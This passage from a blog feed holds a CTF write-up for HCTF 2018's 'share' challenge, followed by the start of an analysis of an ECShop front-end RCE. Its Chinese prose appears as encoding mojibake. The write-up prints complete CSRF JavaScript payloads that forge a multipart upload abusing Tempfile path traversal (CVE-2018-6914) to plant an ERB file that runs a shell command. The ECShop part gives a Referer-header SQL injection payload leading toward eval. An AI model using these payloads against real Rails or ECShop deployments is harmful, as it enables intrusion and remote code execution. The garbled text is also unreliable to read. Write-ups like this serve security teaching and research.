class="regexp">      end</span></span><br><span class="line"><span class="regexp">      share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public</span><span class="regexp">/upload")</span></span><br><span class="line"><span class="regexp">      share.write(Base64.decode64(file.read))</span></span><br><span class="line"><span class="regexp">      share.close</span></span><br><span class="line"><span class="regexp">      File.rename(share.path,share.path+"."+ext)</span></span><br><span class="line"><span class="regexp">      tmp = Sharefile.new</span></span><br><span class="line"><span class="regexp">      tmp.public = 0</span></span><br><span class="line"><span class="regexp">      tmp.path = share.path</span></span><br><span class="line"><span class="regexp">      tmp.name = name</span></span><br><span class="line"><span class="regexp">      tmp.tempname= share.path.split('/</span><span class="string">')[-1]+"."+ext</span></span><br><span class="line"><span class="string">      tmp.context = params[:file][:context]</span></span><br><span class="line"><span class="string">      tmp.save</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    redirect_to root_path</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># post /file/Alpha_test</span></span><br><span class="line"><span class="string">  def Alpha_test</span></span><br><span class="line"><span class="string">    if(params[:fid] != "" &amp;&amp; params[:uid] != "" &amp;&amp; params[:fid] != nil &amp;&amp; params[:uid] != nil)</span></span><br><span class="line"><span class="string">      fid = params[:fid].to_i</span></span><br><span class="line"><span class="string">      uid = params[:uid].to_i</span></span><br><span class="line"><span class="string">      if(fid &gt; 0 &amp;&amp; uid &gt; 0)</span></span><br><span class="line"><span class="string">        if(Sharelist.find_by(sharefile_id: fid)==nil)</span></span><br><span class="line"><span class="string">          if(Sharelist.count("user_id = ?", uid.to_s) &lt;5)</span></span><br><span class="line"><span class="string">            share = Sharelist.new</span></span><br><span class="line"><span class="string">            share.sharefile_id = fid</span></span><br><span class="line"><span class="string">            share.user_id = uid</span></span><br><span class="line"><span class="string">            share.save</span></span><br><span class="line"><span class="string">          end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string">      end</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    redirect_to(root_path)</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  def share_file_to_all</span></span><br><span class="line"><span class="string">    file = Sharefile.find(params[:fid])</span></span><br><span class="line"><span class="string">    File.rename(file.path,Rails.root+"/public/download/"+file.name)</span></span><br><span class="line"><span class="string">    file.public = true</span></span><br><span class="line"><span class="string">    file.path = Rails.root+"/public/download/"+file.name</span></span><br><span class="line"><span class="string">    file.save</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">end</span></span><br></pre></td></tr></table></figure>
<p>åˆ†æä¸€ä¸‹è¿™æ®µä»£ç ï¼Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before_action :authenticate_user!</span><br><span class="line">before_action :authenticate_role</span><br><span class="line">before_action :authenticate_admin</span><br></pre></td></tr></table></figure><br>é¦–å…ˆä¸‰ä¸ªæ¥å£éƒ½æ˜¯ç®¡ç†å‘˜æ‰èƒ½è°ƒç”¨</p>
<p>ç¬¬ä¸€ä¸ªæ¥å£/file/upload èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶<br>ç¬¬äºŒä¸ªæ¥å£/file/Alpha_test èƒ½å¤Ÿåˆ†é…ä¸€ä¸ªæ–‡ä»¶ç»™ä¸€ä¸ªç”¨æˆ·<br>ç¬¬ä¸‰ä¸ªæ˜¯æŠŠæ–‡ä»¶å…¬å¼€ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›å¤–éƒ¨è°ƒç”¨è·¯ç”±</p>
<p>åé¢ hint1ç»™äº†æ–‡ä»¶ç»“æ„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">views</span><br><span class="line">|-- devise</span><br><span class="line">|   |-- confirmations</span><br><span class="line">|   |-- mailer</span><br><span class="line">|   |-- passwords</span><br><span class="line">|   |-- registrations</span><br><span class="line">|   |   &#96;-- new.html.erb</span><br><span class="line">|   |-- sessions</span><br><span class="line">|   |   &#96;-- new.html.erb</span><br><span class="line">|   |-- shared</span><br><span class="line">|   &#96;-- unlocks</span><br><span class="line">|-- file</span><br><span class="line">|-- home</span><br><span class="line">|   |-- Alphatest.erb</span><br><span class="line">|   |-- addtest.erb</span><br><span class="line">|   |-- home.erb</span><br><span class="line">|   |-- index.html.erb</span><br><span class="line">|   |-- publiclist.erb</span><br><span class="line">|   |-- share.erb</span><br><span class="line">|   &#96;-- upload.erb</span><br><span class="line">|-- layouts</span><br><span class="line">|   |-- application.html.erb</span><br><span class="line">|   |-- mailer.html.erb</span><br><span class="line">|   &#96;-- mailer.text.erb</span><br><span class="line">&#96;-- recommend</span><br><span class="line">     &#96;-- show.erb</span><br></pre></td></tr></table></figure></p>
<p>hint2ç»™äº†ä¸€ä¸ªä¸»é¡µçš„ä»£ç <br><code>&lt;%= render template: &quot;home/&quot;+params[:page] %&gt;</code><br>å‚è€ƒ<a href="http://blog.neargle.com/SecNewsBak/drops/Ruby%20on%20Rails%20%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28CVE.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a><br>å°è¯•è·¨ç›®å½•åŒ…å«æ–‡ä»¶å¤±è´¥ï¼Œåº”è¯¥æ˜¯åªèƒ½åŒ…å«homeç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>hint3ç»™äº†rubyç‰ˆæœ¬2.5.0<br>é€šè¿‡æŸ¥æ‰¾rubyç‰ˆæœ¬å·ï¼Œç»“åˆrobotsä»£ç ï¼Œä¸»é¡µä»£ç å’Œç›®å½•ç»“æ„ï¼Œå¯ä»¥ç¡®å®šè¦åˆ©ç”¨çš„æ˜¯è¿™ä¸ªCVEï¼š<br>CVE-2018-6914: Unintentional file and directory creation with directory traversal in tempfile and tmpdir<br>å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨Tempfile åˆ›å»ºæ–‡ä»¶æ—¶å¦‚æœä¼ å…¥(../)å°±èƒ½åˆ›å»ºä»»æ„ç›®å½•æˆ–æ–‡ä»¶<br>æƒ³åˆ°å¯ä»¥ä¼ ä¸ªæ–‡ä»¶åˆ°homeä¸‹ï¼Œç»“åˆä¸»é¡µçš„æ–‡ä»¶åŒ…å«ï¼Œå³å¯RCE</p>
<p>æ•´ä¸ªæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼š</p>
<ol>
<li>CSRF è®©adminè°ƒç”¨/file/upload æ¥å£ä¸Šä¼ å¸¦æœ‰æ¶æ„æ–‡ä»¶åçš„æ–‡ä»¶</li>
<li>Tmpfileæ¼æ´ä½¿å¾—æ–‡ä»¶ç”Ÿæˆåœ¨/views/home/ç›®å½•ä¸‹ï¼Œä½†æ˜¯æ–°ç”Ÿæˆçš„æ–‡ä»¶åæœ‰éƒ¨åˆ†æ˜¯éšæœºçš„</li>
<li>CSRF è°ƒç”¨/file/Alpha_test æ¥å£æŠŠæ–‡ä»¶åˆ†é…åˆ°è‡ªå·±çš„idä¸‹ï¼Œåœ¨/Alphatestæ‹¿åˆ°ç”Ÿæˆçš„æ–‡ä»¶å</li>
<li>ä¸»é¡µæ–‡ä»¶åŒ…å«ï¼ŒRCE</li>
</ol>
<p>äºæ˜¯å¼€å§‹äº†è‰°éš¾çš„æ„é€ payload<br>æœ€åä¸Šä¼ çš„payloadå¦‚ä¸‹ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">(i)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> test=$(<span class="string">'meta'</span>).eq(<span class="number">1</span>).attr(<span class="string">"content"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> url=<span class="string">"/file/upload"</span>;</span></span><br><span class="line"><span class="actionscript">Â  <span class="keyword">var</span> data=<span class="string">"-----------------------------13025814701038468772945051835\x0d\x0a\</span></span></span><br><span class="line">Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\</span><br><span class="line">Content-Type: application/text\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">de1ta\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line"><span class="actionscript"><span class="string">"+test+"</span>\x0d\x0a\</span></span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\"commit\"\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">submit\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">âœ“\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835--";</span><br><span class="line"><span class="javascript">Â  $.ajax(&#123;</span></span><br><span class="line">Â  Â url: url,</span><br><span class="line"><span class="actionscript">Â  Â type:<span class="string">"POST"</span>,</span></span><br><span class="line">Â  Â headers: &#123;</span><br><span class="line"><span class="actionscript">Â  Â  Â  Â <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=---------------------------13025814701038468772945051835"</span>,</span></span><br><span class="line"><span class="actionscript">Â  Â  Â  Â <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span></span></span><br><span class="line">Â  Â &#125;,</span><br><span class="line">Â  Â data:data,</span><br><span class="line"><span class="actionscript">Â  Â contentType:<span class="literal">false</span>,</span></span><br><span class="line"><span class="actionscript">Â  Â success:<span class="function"><span class="keyword">function</span><span class="params">(res)</span></span>&#123;</span></span><br><span class="line">Â  Â &#125;,</span><br><span class="line"><span class="actionscript">Â  Â error:<span class="function"><span class="keyword">function</span><span class="params">(err)</span></span>&#123;</span></span><br><span class="line">Â  Â &#125;</span><br><span class="line">Â  &#125;)</span><br><span class="line">Â &#125;</span><br><span class="line"><span class="actionscript">Â <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">2</span>;i++)</span></span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  upload(i);</span><br><span class="line">Â &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>æ–‡ä»¶å†…å®¹ä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%&#x3D; &#96;cat &#x2F;flag&#96; %&gt;</span><br></pre></td></tr></table></figure><br>æ–‡ä»¶åä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;app&#x2F;views&#x2F;home&#x2F;de1taxishir.erbss.erb</span><br></pre></td></tr></table></figure></p>
<p>æ¨é€æ–‡ä»¶åˆ°æˆ‘çš„uidä¸‹çš„ä»£ç ä¸ºï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">(fffid)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">Â  <span class="keyword">var</span> test=$(<span class="string">'meta'</span>).eq(<span class="number">1</span>).attr(<span class="string">"content"</span>);</span></span><br><span class="line"><span class="javascript">Â  <span class="built_in">console</span>.log(test);</span></span><br><span class="line"><span class="actionscript">Â  <span class="keyword">var</span> params = &#123;utf8:<span class="string">"\xE2\x9C\x93"</span>,authenticity_token:test,uid:<span class="number">2</span>,fid:fffid,commit:<span class="string">"submit"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">Â  <span class="keyword">var</span> url = <span class="string">'/file/Alpha_test'</span>;</span></span><br><span class="line"><span class="javascript">$.ajax(&#123;</span></span><br><span class="line">Â  Â url : url,</span><br><span class="line"><span class="actionscript">Â  Â type : <span class="string">"POST"</span>,</span></span><br><span class="line">Â  Â data : params,</span><br><span class="line"><span class="actionscript">Â  Â success : <span class="function"><span class="keyword">function</span><span class="params">(result)</span> </span>&#123;</span></span><br><span class="line">Â  Â &#125;,</span><br><span class="line"><span class="actionscript">Â  Â error:<span class="function"><span class="keyword">function</span><span class="params">(result)</span></span>&#123;</span></span><br><span class="line">Â  Â &#125;</span><br><span class="line">Â &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">20</span>;i+=<span class="number">1</span>)&#123;</span></span><br><span class="line">Â  go(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œå› ä¸ºä¸çŸ¥é“æ–‡ä»¶idæ˜¯å¤šå°‘ï¼Œåªèƒ½æ ¹æ®å‰é¢çš„filenumberæ¥çˆ†ç ´ä¸€ä¸‹ï¼Œæ‰€ä»¥å†™äº†ä¸ªforå¾ªç¯<br>æœ€åä¸Šä¼ ä¸Šå»å¹¶è·å–æ–‡ä»¶ååï¼Œåœ¨ä¸»é¡µè¿›è¡Œæ–‡ä»¶åŒ…å«æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–flag</p>
<p><img src="/img/2018-hctf-4.png" alt=""></p>
<p>psï¼šè¿™é“é¢˜æœ‰ä¸ªæ…ğŸ’©bugï¼Œåˆ©ç”¨æ¨æ–‡ä»¶ç»™ç”¨æˆ·æ¥å£ï¼Œæ— é™æš´åŠ›æ¨fidåˆ°è‡ªå·±çš„uidä¸‹ï¼Œå°±èƒ½çœ‹åˆ°åˆ«äººä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶ä¸”åˆ«äººå°±ä¸çŸ¥é“ä»–çš„æ–‡ä»¶åæ˜¯å•¥äº†</p>
<p>è¿˜æœ‰å°±æ˜¯jsæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å¤ªå‘äº†ï¼Œä¸€å¼€å§‹ç”¨new Fileï¼Œä¸€ç›´å¤±è´¥ï¼Œåé¢å‘ç°æ˜¯PhantomJSä¸æ”¯æŒè¿™ä¸ªh5çš„ç±»å¥½åƒï¼Œäºæ˜¯ç¡¬ç”Ÿç”Ÿå†™äº†ä¸ªmultipart/form-data å‡ºæ¥</p>
<blockquote>
<p>flag:hctf{8f4c57063ddb7b106e03e25f7d1bb813}</p>
</blockquote>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œå°¤å…¶æ˜¯shareè¿™é“é¢˜ï¼Œæœ€åç»™æ­ç”µçš„å‡ºé¢˜å’Œè¿ç»´å¸ˆå‚…ä»¬é€’èŒ¶ï¼Œç»™é˜Ÿå‹ä»¬é€’èŒ¶ï¼</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«è‚äº†ä¸¤å¤©HCTFï¼Œæ„Ÿè°¢é˜Ÿå‹ä»¬å¸¦é£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„WEBé¢˜&lt;br&gt;é¡ºä¾¿æ‰“ä¸ªå°å¹¿å‘Šï¼šDe1taé•¿æœŸæ‹› é€†å‘/pwn/å¯†ç å­¦/ç¡¬ä»¶/å–è¯/æ‚é¡¹/etc. é€‰æ‰‹ï¼Œæ€¥æ‹›äºŒè¿›åˆ¶å’Œå¯†ç é€‰æ‰‹,æœ‰æ„å‘çš„å¤§ä½¬è¯·è”ç³»ZGUxdGFAcHJvdG9ubWFpbC5jb20=&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>ECShopå‰å°RCEæ¼æ´åˆ†æ</title>
    <link href="https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/"/>
    <id>https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/</id>
    <published>2018-09-10T05:11:58.000Z</published>
    <updated>2018-09-10T12:06:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><p>å‰å‡ å¤©å‡ºäº†ä¸ª<code>ECShop&lt;= 2.7.x/3.6.x</code>å‰å°RCEï¼Œå®è®­å¤ªæ— èŠäº†æ¥åˆ†æä¸€æ³¢<br><a id="more"></a></p>
<h2 id="0x01ç¯å¢ƒæ­å»º"><a href="#0x01ç¯å¢ƒæ­å»º" class="headerlink" title="0x01ç¯å¢ƒæ­å»º"></a>0x01ç¯å¢ƒæ­å»º</h2><ul>
<li><a href="http://download.ecshop.com/2.7.3/ECShop_V2.7.3_UTF8_release1106.rar" target="_blank" rel="noopener">ECShop_V2.7.3</a></li>
<li>nginx</li>
<li>php</li>
</ul>
<h2 id="0x02æ¼æ´åŸç†"><a href="#0x02æ¼æ´åŸç†" class="headerlink" title="0x02æ¼æ´åŸç†"></a>0x02æ¼æ´åŸç†</h2><p>æ¼æ´çš„è§¦å‘ç‚¹åœ¨/user.php:301ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç é€»è¾‘åšäº†ä¸ªåˆ¤æ–­ï¼Œå¦‚æœhttpå¤´éƒ¨çš„refererä¸åŒ…å«<code>user.php</code>ï¼Œå°±å°†refererèµ‹å€¼ç»™<code>$back_act</code>  </p>
<p><img src="/img/2018-ecshop-rce-1.png" alt="">  </p>
<p>æ¥ä¸‹æ¥ç¬¬325è¡Œä»¥$back_actçš„å€¼ä¸ºå‚æ•°ï¼Œä¼ å…¥<code>assign</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯æ³¨å†Œå˜é‡ï¼Œå°†å¯æ§å˜é‡ä¼ é€’ç»™æ¨¡æ¿å¯¹è±¡ï¼Œæ¥ç€ä½¿ç”¨displayæ–¹æ³•å°±èƒ½å°†è¿™ä¸ªæ¨¡æ¿æ¸²æŸ“å‡ºæ¥ï¼Œæ¥çœ‹ä¸€ä¸‹<code>display</code>æ–¹æ³•çš„å…·ä½“å®ç°ï¼ˆ/includes/cls_template.php:100)  </p>
<p><img src="/img/2018-ecshop-rce-2.png" alt="">  </p>
<p>å¯ä»¥çœ‹åˆ°ä»£ç è·å–äº†$outï¼Œ$outä¸­æœ‰ä¸€éƒ¨åˆ†ä»£ç å°±æ˜¯å‰é¢assignæ³¨å†Œçš„å˜é‡ï¼ˆè¿™é‡Œçš„æŠ€æœ¯ç»†èŠ‚æˆ‘å°±ä¸è®¨è®ºäº†ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥ç ”ç©¶ç ”ç©¶ï¼‰ï¼Œç„¶åå°†$outä¾æ®<code>$_echash</code>åˆ†å‰²å¹¶ä¸”å¯¹å¥‡æ•°å—æ‰§è¡Œäº†insert_modæ–¹æ³•ï¼Œ<code>$_echash</code>æ˜¯ä»£ç é‡Œå†™æ­»çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $_echash        = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br></pre></td></tr></table></figure><br>æ‰€ä»¥è¿™é‡Œçš„$valæ˜¯å¯æ§çš„ï¼Œç»§ç»­å¾€ä¸‹è·Ÿ<code>insert_mod</code>æ–¹æ³•ï¼ˆ/includes/cls_template.php:1155ï¼‰  </p>
<p><img src="/img/2018-ecshop-rce-3.png" alt="">  </p>
<p>è¯¥æ–¹æ³•å®ç°äº†ä¸€ä¸ªåŠ¨æ€å‡½æ•°è°ƒç”¨ï¼Œå°†ä¼ å…¥çš„å­—ç¬¦ä¸²åˆ†å‰²åï¼Œå‰åŠéƒ¨åˆ†æ‹¼æ¥è¿›å‡½æ•°åï¼ŒååŠéƒ¨åˆ†ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡å¹¶ä¼ å…¥è¯¥å‡½æ•°ï¼ˆè¿™é‡Œå› ä¸ºå‚æ•°å¯æ§ï¼Œç›´æ¥å°±èƒ½ååºåˆ—åŒ–æ¼æ´äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ²¡æœ‰å¸ˆå‚…æåˆ°ï¼Œå¯èƒ½æ˜¯è¢«RCEæ©ç›–äº†8ï¼‰ï¼Œæ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å°±èƒ½è°ƒç”¨ä¸€ä¸ª<code>insert_</code>å¼€å¤´çš„å‡½æ•°ï¼Œè¿™é‡Œé€šè¿‡ç½‘ä¸Šæµä¼ çš„payloadå¯ä»¥çŸ¥é“æ˜¯è°ƒç”¨äº†ä¸€ä¸ª<code>insert_ads</code>æ–¹æ³•ï¼ˆ/includes/lib_insert.php:136ï¼‰</p>
<p><img src="/img/2018-ecshop-rce-4.png" alt="">  </p>
<p>ä»£ç å°†ä¼ å…¥çš„å¯¹è±¡å–å‡ºnumå’Œidæ‹¼æ¥è¿›sqlè¯­å¥ï¼Œå› ä¸ºå¯¹è±¡æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨äº†sqlæ³¨å…¥æ¼æ´ï¼Œç»“åˆå‰é¢çš„$outåˆ†å‰²å’Œåˆ†å‰²å–adså‡½æ•°åå’Œååºåˆ—åŒ–å¯ä»¥æ„é€ æ³¨å…¥payloadå¦‚ä¸‹<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:36:"*/ union select 1,2,3,4,5,6,7,8,9,10";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure><br>æ‹¼æ¥è¿›å»åçš„sqlé•¿è¿™æ ·<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="keyword">RAND</span>() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad`</span> <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad_position`</span> <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id = p.position_id <span class="keyword">WHERE</span> enabled = <span class="number">1</span> <span class="keyword">AND</span> start_time &lt;= <span class="string">'1536544160'</span> <span class="keyword">AND</span> end_time &gt;= <span class="string">'1536544160'</span> <span class="keyword">AND</span> a.position_id = <span class="string">''</span><span class="comment">/*' ORDER BY rnd LIMIT */</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure><br>æ”¾åˆ°æ•°æ®åº“é‡Œå¯ä»¥æˆåŠŸunion selectå‡ºæ•°æ®  </p>
<p><img src="/img/2018-ecshop-rce-5.png" alt="">  </p>
<p>è¿™æ„å‘³ç€æŸ¥è¯¢å‡ºçš„ç»“æœä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œç»§ç»­å•ƒä»£ç ï¼Œå¯ä»¥çŸ¥é“æŸ¥è¯¢å‡ºæ¥çš„position_idç­‰äºä¼ å…¥å¯¹è±¡çš„idå±æ€§æ—¶ï¼Œ<code>$position_style</code>ä¼šè¢«èµ‹å€¼ä¸ºæŸ¥è¯¢å‡ºçš„<code>position_style</code>å¹¶åŠ å…¥å‰ç¼€<code>str:</code>æ¥ç€ä¼ å…¥fetchæ–¹æ³•ä¸­<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br><span class="line">        .</span><br><span class="line">        .</span><br><span class="line">        .</span><br><span class="line"> $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br></pre></td></tr></table></figure><br>è·Ÿè¿›fetchæ–¹æ³•ï¼Œåé¢å°±æ˜¯ä¸€æ¡é•¿é•¿çš„åˆ©ç”¨é“¾äº†ï¼š</p>
<ul>
<li>fetchï¼ˆ/includes/cls_template.php:135ï¼‰ï¼šå–str:åçš„å­—ç¬¦ä¸²ï¼Œ<code>fetch_str</code>å¤„ç†åä¼ å…¥_evalæ‰§è¡Œ</li>
<li>_evalï¼ˆ/includes/cls_template.php:1179ï¼‰ï¼šå°†å‚æ•°æ‹¼æ¥è¿›eval()æ‰§è¡Œ</li>
